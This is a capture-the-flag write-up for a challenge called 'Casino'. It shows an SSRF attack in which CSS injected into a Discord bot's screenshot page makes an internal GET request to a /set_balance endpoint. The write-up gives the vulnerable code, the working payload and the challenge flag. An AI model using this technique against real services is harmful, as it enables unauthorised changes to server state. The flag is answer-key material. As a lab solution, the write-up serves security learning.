# Casino

Can you make $1000 off Casino#4970 on our Discord server? (say `$help` to view commands)

Attachments: `casino.zip`

## Solution

Exploit: SSRF to `/set_balance` endpoint using CSS

The web server trusts input from the Discord bot:
```javascript
function internal (req, res, next) {
  if (
    req.socket.remoteAddress === '172.16.0.11' ||
    req.socket.remoteAddress === '::ffff:172.16.0.11'
  ) {
    return next()
  }

  return res.status(403).end()
}
```

The Discord bot visits `/badge` and screenshots it when we do the `!badge`
command. It also allows us to add arbitrary CSS, though angle brackets are escaped:
```javascript
const css = (req.query.css || '').replace(/</g, '&lt;').replace(/>/g, '&gt;')
```

We can't escape from the `<style>` tag, but we can still make GET requests using:
```css
background-image: url(http://malicious)
```

Also the challenge author is an idiot and `/set_balance` is conveniently a GET
endpoint. So all we have to do is send this message
```
!badge `#badge { background-image: url(http://172.16.0.10:3000/set_balance?user=qxxxb%238938&balance=1000) }`
```

Then `!flag` to get `CCC{maybe_1_sh0uldv3d_us3d_P0ST_in5t3ad_of_G3T}`
